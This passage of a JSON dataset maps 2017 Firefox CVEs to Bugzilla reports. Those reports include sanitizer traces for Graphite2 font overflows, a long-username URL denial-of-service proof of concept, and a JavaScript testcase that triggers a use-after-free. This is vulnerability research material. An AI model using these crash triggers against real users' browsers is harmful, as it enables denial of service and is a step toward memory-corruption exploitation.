        "description": "Found in 28cc60d with a 32 bit build. To reproduce run: ./gr2fonttest -auto -demand test_case.ttf ==4360==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf5202b0f at pc 0x081ad092 bp 0xffadad08 sp 0xffadacfc WRITE of size 16 at 0xf5202b0f thread T0 #0 0x81ad091 in (anonymous namespace)::safe_copy(unsigned char*, unsigned char const*, unsigned int) src/inc/Compression.h:65:22 #1 0x81ad091 in lz4::decompress(void const*, unsigned int, void*, unsigned int) src/Decompressor.cpp:103 #2 0x814e6ac in graphite2::Face::Table::decompress() src/Face.cpp:339:20 #3 0x814dd32 in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) src/Face.cpp:292:9 #4 0x8140540 in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) src/gr_face.cpp:49:21 #5 0x8141aba in gr_make_face_with_ops src/gr_face.cpp:89:16 #6 0x8141aba in gr_make_file_face src/gr_face.cpp:242 #7 0x813b99e in Parameters::testFileFont() const gr2fonttest/gr2FontTest.cpp:639:20 #8 0x813d9d3 in main gr2fonttest/gr2FontTest.cpp:798:9 #9 0xf753c636 in __libc_start_main /build/glibc-5sb1ri/glibc-2.23/csu/../csu/libc-start.c:291 #10 0x805fe47 in _start (graphite2/gr2fonttest+0x805fe47) 0xf5202b0f is located 11 bytes to the right of 10756-byte region [0xf5200100,0xf5202b04) allocated by thread T0 here: #0 0x8104184 in __interceptor_malloc (/home/user/workspace/graphite2/gr2fonttest+0x8104184) #1 0x814e5f2 in unsigned char* graphite2::gralloc<unsigned char>(unsigned int) src/inc/Main.h:88:28 #2 0x814e5f2 in graphite2::Face::Table::decompress() src/Face.cpp:333 #3 0x814dd32 in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) src/Face.cpp:292:9 #4 0x8140540 in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) src/gr_face.cpp:49:21 #5 0x8141aba in gr_make_face_with_ops src/gr_face.cpp:89:16 #6 0x8141aba in gr_make_file_face src/gr_face.cpp:242 #7 0x813b99e in Parameters::testFileFont() const gr2fonttest/gr2FontTest.cpp:639:20 #8 0x813d9d3 in main gr2fonttest/gr2FontTest.cpp:798:9 #9 0xf753c636 in __libc_start_main /build/glibc-5sb1ri/glibc-2.23/csu/../csu/libc-start.c:291"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1350047",
        "title": "Graphite2: out of bounds read [@ graphite2::Pass::readPass]",
        "description": "Found with a 32bit build running gr2FontTest. Invalid read of size 1 at 0x807EBDD: _peek<1> (Endian.h:77) by 0x807EBDD: read<unsigned char> (Endian.h:60) by 0x807EBDD: graphite2::Pass::readPass(unsigned char const*, unsigned int, unsigned int, graphite2::Face&, graphite2::passtype, unsigned int, graphite2::Error&) (Pass.cpp:102) by 0x80650B2: graphite2::Silf::readGraphite(unsigned char const*, unsigned int, graphite2::Face&, unsigned int) (Silf.cpp:216) by 0x80555B7: graphite2::Face::readGraphite(graphite2::Face::Table const&) (Face.cpp:149) by 0x804EF04: (anonymous namespace)::load_face(graphite2::Face&, unsigned int) (gr_face.cpp:59) by 0x804FCE8: gr_make_face_with_ops (gr_face.cpp:89) by 0x804FCE8: gr_make_file_face (gr_face.cpp:242) by 0x804C77A: Parameters::testFileFont() const (gr2FontTest.cpp:639) by 0x804D936: main (gr2FontTest.cpp:798) Address 0xe3406f0a is not stack'd, malloc'd or (recently) free'd Process terminating with default action of signal 11 (SIGSEGV) Access not within mapped region at address 0xE3406F0A at 0x807EBDD: _peek<1> (Endian.h:77) by 0x807EBDD: read<unsigned char> (Endian.h:60) by 0x807EBDD: graphite2::Pass::readPass(unsigned char const*, unsigned int, unsigned int, graphite2::Face&, graphite2::passtype, unsigned int, graphite2::Error&) (Pass.cpp:102) by 0x80650B2: graphite2::Silf::readGraphite(unsigned char const*, unsigned int, graphite2::Face&, unsigned int) (Silf.cpp:216) by 0x80555B7: graphite2::Face::readGraphite(graphite2::Face::Table const&) (Face.cpp:149) by 0x804EF04: (anonymous namespace)::load_face(graphite2::Face&, unsigned int) (gr_face.cpp:59) by 0x804FCE8: gr_make_face_with_ops (gr_face.cpp:89) by 0x804FCE8: gr_make_file_face (gr_face.cpp:242) by 0x804C77A: Parameters::testFileFont() const (gr2FontTest.cpp:639) by 0x804D936: main (gr2FontTest.cpp:798)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1349310",
        "title": "Graphite2 lz4::decompress out of bounds write",
        "description": "On 32 bit systems an out of bounds write read/write can occur during the decompressing of a lz4 compressed graphite font table. valgrind log (with gr2fonttest tool): Invalid read of size 16 at 0x4048550: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685218d is 16,843,109 bytes inside a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid read of size 16 at 0x4048555: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685219d is 8 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid write of size 8 at 0x404855A: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x6852195 is 0 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid write of size 8 at 0x404855E: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685219d is 8 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid read of size 16 at 0x4048567: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x68521ad is 16,843,141 bytes inside a block of size 16,846,784 in arena \"client\""
      }
    ],
    "CVE-2017-7779": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1354443%2C1368576%2C1366903%2C1369913%2C1371424%2C1346590%2C1371890%2C1372985%2C1362924%2C1368105%2C1369994%2C1371283%2C1368362%2C1378826%2C1380426%2C1368030%2C1373220%2C1321384%2C1383002",
        "description": "On 32 bit systems an out of bounds write read/write can occur during the decompressing of a lz4 compressed graphite font table. valgrind log (with gr2fonttest tool): Invalid read of size 16 at 0x4048550: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685218d is 16,843,109 bytes inside a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid read of size 16 at 0x4048555: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685219d is 8 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid write of size 8 at 0x404855A: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x6852195 is 0 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid write of size 8 at 0x404855E: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685219d is 8 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid read of size 16 at 0x4048567: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x68521ad is 16,843,141 bytes inside a block of size 16,846,784 in arena \"client\""
      }
    ],
    "CVE-2017-7780": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1353763%2C1353356%2C1370070%2C1375435%2C1373663%2C1363150%2C1370817%2C1273678%2C1367850%2C1347968%2C1361749%2C1349138%2C1371982%2C1344666%2C1369836%2C1330739%2C1371511%2C1371484",
        "description": "On 32 bit systems an out of bounds write read/write can occur during the decompressing of a lz4 compressed graphite font table. valgrind log (with gr2fonttest tool): Invalid read of size 16 at 0x4048550: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685218d is 16,843,109 bytes inside a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid read of size 16 at 0x4048555: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685219d is 8 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid write of size 8 at 0x404855A: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x6852195 is 0 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid write of size 8 at 0x404855E: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x685219d is 8 bytes after a block of size 16,843,117 alloc'd at 0x402D17C: malloc by 0x4049567: graphite2::Face::Table::decompress() (in /src/libgraphite2.so.3.0.1) Invalid read of size 16 at 0x4048567: lz4::decompress(void const*, unsigned int, void*, unsigned int) (in /src/libgraphite2.so.3.0.1) Address 0x68521ad is 16,843,141 bytes inside a block of size 16,846,784 in arena \"client\""
      }
    ],
    "CVE-2017-7782": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1344034",
        "title": "A single RWX page is getting allocated on Windows",
        "description": "On Windows, I frequently see a single RWX (\"Execute/Read/Write\") 4k block (a single page). Occasionally I see two. This was observed with both Firefox Nightly and Release. This violates Firefox's W^X/DEP protection. STR: 1. Download VMMap (https://technet.microsoft.com/en-us/sysinternals/vmmap.aspx) and run it. 2. Choose File > Select Process... > Launch and Trace a New Process > Application and select firefox.exe 3. Look at the \"Details\" block (bottom half of the VMMap window) and sort by \"Protection\". One or two \"Execute/Read/Write\" blocks of 4k each are typically visible. (I have tried to click the \"Heap Allocations...\" button to examine the RWX page's allocation call stack, but the button remains disabled. I don't know why.) Desired result: No \"Execute/Read/Write\" blocks should be produced. Also, it would be nice to add an automated test that detects such RWX blocks in the future."
      }
    ],
    "CVE-2017-7783": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1360842",
        "title": "DOS using long Username in URL scheme",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Description: - To send username and password with a URL, we use this scheme: http://UserName:Password@mozilla.org - Opon visiting URL's of this scheme a prompt box is displayed confirming the login. - The prompt box displays a message containing the username (From the URL). - By supplying a very long value for the username we can make the prompt box crash. (Not a browser crash) - This crash will cause DOS for the victim, and his browser will get locked out. Note: I am able to crash with 10k characters long username. Proof of Concept: I can always reproduce by following these steps: 1. Start Firefox by clicking on the desktop icon 2. Press Cmd+N (or Ctrl+N for Windows users) to open a new browser window 3. Host the \"Crash.php\" file on your webserver. (Available as an attachment) 4. Paste http://<Your WebServer Address>/Crash.php in the address bar and press Enter 5. You browser will get locked out(DOS). Proof of Concept URL: http://poc.rf.gd/crash.php Expected results: The prompt box displays correctly. Actual results: The prompt box crashes due to which DOS attack is performed on the victim. Impact: An attacker can create a webpage having some content and exploit. Now once a victim visits this webpage, his browser gets locked out and he is forcibly made to view attacker supplied content. Recommended Fix: In the prompt box message, long usernames should be reconfigured to partially display such as:- UserName: ThisIsALongUserName Partial Value: ThisIsALongUse..."
      }
    ],
    "CVE-2017-7784": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1376087",
        "title": "heap-use-after-free in nsImageLoadingContent::Notify",
        "description": "The latest ASAN build of Firefox 52.2.1 ESR (BuildID=20170621154102) crash when loading the following testcase. It requires 1px.png in the same directory (or any other PNG file). <script> function start() { o0=document.createElement('iframe'); document.body.appendChild(o0); o1=open('1px.png','popup46','height=16'); o1.onload=fun0; o2=o0.contentDocument; } function fun0(e) { o10=window.open('data:text/html,<div>','popup68','left=74'); o10.onload=fun1; o13=e.target; tmpall=o13.getElementsByTagName('*'); o19=tmpall[8]; } function fun1(e) { o21=e.target; o71=o2.createElementNS('http://www.w3.org/2000/svg','filter'); o92=o2.createElementNS('http://www.w3.org/2000/svg','feBlend'); o71.appendChild(o92); tmpall[0].appendChild(o71); o111=o21.createElementNS('http://www.w3.org/2000/svg','filter'); o145=o21.createElementNS('http://www.w3.org/2000/svg','feMerge'); o111.appendChild(o145); o71.insertBefore(o111,o92); o207=o13.createElementNS('http://www.w3.org/1999/xhtml','style'); o208=o13.createTextNode(\"*{ display: ruby-text-container;}\"); o207.appendChild(o208); o145.appendChild(o207); o19.setAttribute('src', '1px.png?1'); setTimeout(\"location.reload()\",100); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==2364==ERROR: AddressSanitizer: heap-use-after-free on address 0x602000457ab8 at pc 0x7f1895b2c8e4 bp 0x7ffd0904f1d0 sp 0x7ffd0904f1c8 READ of size 8 at 0x602000457ab8 thread T0 #0 0x7f1895b2c8e3 in nsImageLoadingContent::Notify(imgIRequest*, int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/dom/base/nsImageLoadingContent.cpp:155:24 #1 0x7f189583d1be in imgRequestProxy::Notify(int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/image/imgRequestProxy.cpp:790:3 #2 0x7f18957f7ee9 in operator() /home/worker/workspace/build/src/image/ProgressTracker.cpp:315:42 #3 0x7f18957f7ee9 in void mozilla::image::ImageObserverNotifier<mozilla::image::ObserverTable const*>::operator()<void mozilla::image::SyncNotifyInternal<mozilla::image::ObserverTable const*>(mozilla::image::ObserverTable const* const&, bool, unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&)::{lambda(mozilla::image::IProgressObserver*)#1}>(void mozilla::image::SyncNotifyInternal<mozilla::image::ObserverTable const*>(mozilla::image::ObserverTable const* const&, bool, unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&)::{lambda(mozilla::image::IProgressObserver*)#1}) /home/worker/workspace/build/src/image/ProgressTracker.cpp:274 #4 0x7f18957f7b80 in void mozilla::image::SyncNotifyInternal<mozilla::image::ObserverTable const*>(mozilla::image::ObserverTable const* const&, bool, unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/image/ProgressTracker.cpp:315:5 #5 0x7f18957f3c31 in operator() /home/worker/workspace/build/src/image/ProgressTracker.cpp:394:5 #6 0x7f18957f3c31 in Read<(lambda at /home/worker/workspace/build/src/image/ProgressTracker.cpp:393:19)> /home/worker/workspace/build/src/image/CopyOnWrite.h:154 #7 0x7f18957f3c31 in mozilla::image::ProgressTracker::SyncNotifyProgress(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/image/ProgressTracker.cpp:393 #8 0x7f18957fbade in mozilla::image::RasterImage::NotifyProgress(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::Maybe<unsigned int> const&, mozilla::image::DecoderFlags, mozilla::image::SurfaceFlags) /home/worker/workspace/build/src/image/RasterImage.cpp:1567:3 #9 0x7f1895805ab8 in mozilla::image::RasterImage::NotifyDecodeComplete(mozilla::image::DecoderFinalStatus const&, mozilla::image::ImageMetadata const&, mozilla::image::DecoderTelemetry const&, unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::Maybe<unsigned int> const&, mozilla::image::DecoderFlags, mozilla::image::SurfaceFlags) /home/worker/workspace/build/src/image/RasterImage.cpp:1607:3 #10 0x7f18958792b9 in operator() /home/worker/workspace/build/src/image/IDecodingTask.cpp:87:5 #11 0x7f18958792b9 in mozilla::detail::RunnableFunction<mozilla::image::IDecodingTask::NotifyDecodeComplete(mozilla::NotNull<mozilla::image::RasterImage*>, mozilla::NotNull<mozilla::image::Decoder*>)::$_2>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:324 #12 0x7f18931a38bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #13 0x7f18932259fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #14 0x7f1893fdd40f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #15 0x7f1893f4efc8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #16 0x7f1893f4efc8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #17 0x7f1893f4efc8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #18 0x7f189957819f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #19 0x7f189b5f2451 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #20 0x7f189b789757 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #21 0x7f189b78aecd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #22 0x7f189b78bd8c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #23 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #24 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #25 0x7f18aeb5282f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #26 0x41ba88 in _start (/home/nils/fuzzer3/esr/firefox/firefox+0x41ba88) 0x602000457ab8 is located 8 bytes inside of 16-byte region [0x602000457ab0,0x602000457ac0) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f1895b30123 in operator delete /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:218:12 #2 0x7f1895b30123 in nsImageLoadingContent::RemoveObserver(imgINotificationObserver*) /home/worker/workspace/build/src/dom/base/nsImageLoadingContent.cpp:432 #3 0x7f189a1813b2 in nsImageFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsImageFrame.cpp:213:7 #4 0x7f189a003de3 in nsFrameList::DestroyFramesFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsFrameList.cpp:57:5 #5 0x7f189a004207 in DestroyAbsoluteFrames /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:184:5 #6 0x7f189a004207 in nsContainerFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:218 #7 0x7f189a064f15 in nsCanvasFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:153:3 #8 0x7f189a004378 in DestroyFramesFrom /home/worker/workspace/build/src/layout/generic/nsFrameList.cpp:57:5 #9 0x7f189a004378 in nsContainerFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:221 #10 0x7f189a0782ca in Destroy /home/worker/workspace/build/src/layout/generic/nsIFrame.h:576:20 #11 0x7f189a0782ca in nsContainerFrame::RemoveFrame(mozilla::layout::FrameChildListID, nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:170 #12 0x7f1899ea5566 in nsFrameManager::RemoveFrame(mozilla::layout::FrameChildListID, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:506:5 #13 0x7f1899d73b6b in nsCSSFrameConstructor::ContentRemoved(nsIContent*, nsIContent*, nsIContent*, nsCSSFrameConstructor::RemoveFlags, bool*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8498:5 #14 0x7f1899ce862e in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9685:10 #15 0x7f1899d7572a in nsCSSFrameConstructor::MaybeRecreateContainerForFrameRemoval(nsIFrame*, nsCSSFrameConstructor::RemoveFlags, nsresult*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9475:16 #16 0x7f1899ce82ca in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9659:16 #17 0x7f1899d754de in nsCSSFrameConstructor::MaybeRecreateContainerForFrameRemoval(nsIFrame*, nsCSSFrameConstructor::RemoveFlags, nsresult*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9428:18 #18 0x7f1899ce82ca in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9659:16 #19 0x7f1899d754de in nsCSSFrameConstructor::MaybeRecreateContainerForFrameRemoval(nsIFrame*, nsCSSFrameConstructor::RemoveFlags, nsresult*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9428:18 #20 0x7f1899d733cb in nsCSSFrameConstructor::ContentRemoved(nsIContent*, nsIContent*, nsIContent*, nsCSSFrameConstructor::RemoveFlags, bool*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8370:9 #21 0x7f1899f33ec2 in PresShell::ContentRemoved(nsIDocument*, nsIContent*, nsIContent*, int, nsIContent*) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4477:3 #22 0x7f1895f491fe in nsNodeUtils::ContentRemoved(nsINode*, nsIContent*, int, nsIContent*) /home/worker/workspace/build/src/dom/base/nsNodeUtils.cpp:226:3 #23 0x7f1895ef1540 in nsINode::doRemoveChildAt(unsigned int, bool, nsIContent*, nsAttrAndChildArray&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1926:5 #24 0x7f1895c39cf3 in mozilla::dom::FragmentOrElement::RemoveChildAt(unsigned int, bool) /home/worker/workspace/build/src/dom/base/FragmentOrElement.cpp:1113:5 #25 0x7f18959f54ed in nsContentUtils::SetNodeTextContent(nsIContent*, nsAString_internal const&, bool) /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:4818:7 #26 0x7f1895e0bea6 in nsDocument::SetTitle(nsAString_internal const&) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:6683:10 #27 0x7f18980420dc in mozilla::dom::MediaDocument::UpdateTitleAndCharset(nsACString_internal const&, nsIChannel*, char const* const*, int, int, nsAString_internal const&) /home/worker/workspace/build/src/dom/html/MediaDocument.cpp:415:5 #28 0x7f189803c961 in mozilla::dom::ImageDocument::UpdateTitleAndCharset() /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:794:3 #29 0x7f189803e128 in mozilla::dom::ImageDocument::OnSizeAvailable(imgIRequest*, imgIContainer*) /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:551:3 #30 0x7f189803dd4c in mozilla::dom::ImageDocument::Notify(imgIRequest*, int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:479:12 #31 0x7f189803eecf in non-virtual thunk to mozilla::dom::ImageDocument::Notify(imgIRequest*, int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:474:16 #32 0x7f1895b2c390 in nsImageLoadingContent::Notify(imgIRequest*, int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/dom/base/nsImageLoadingContent.cpp:157:9 #33 0x7f189583d1be in imgRequestProxy::Notify(int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/image/imgRequestProxy.cpp:790:3 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0ded in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f1895b2f9fd in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f1895b2f9fd in nsImageLoadingContent::AddObserver(imgINotificationObserver*) /home/worker/workspace/build/src/dom/base/nsImageLoadingContent.cpp:401 #4 0x7f189a1824fd in nsImageFrame::Init(nsIContent*, nsContainerFrame*, nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsImageFrame.cpp:270:3 #5 0x7f1899d559a4 in InitAndRestoreFrame /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4971:3 #6 0x7f1899d559a4 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:3875 #7 0x7f1899d62996 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6187:3 #8 0x7f1899d57c1b in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10631:5 #9 0x7f1899d57c1b in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4022 #10 0x7f1899d62996 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6187:3 #11 0x7f1899d3f104 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10631:5 #12 0x7f1899d3f104 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10843 #13 0x7f1899d578e1 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4026:9 #14 0x7f1899d62996 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6187:3 #15 0x7f1899d57c1b in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10631:5 #16 0x7f1899d57c1b in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4022 #17 0x7f1899d62996 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6187:3 #18 0x7f1899d3f104 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10631:5 #19 0x7f1899d3f104 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10843 #20 0x7f1899d499ed in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11853:3 #21 0x7f1899d45e48 in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2625:5 #22 0x7f1899d69076 in 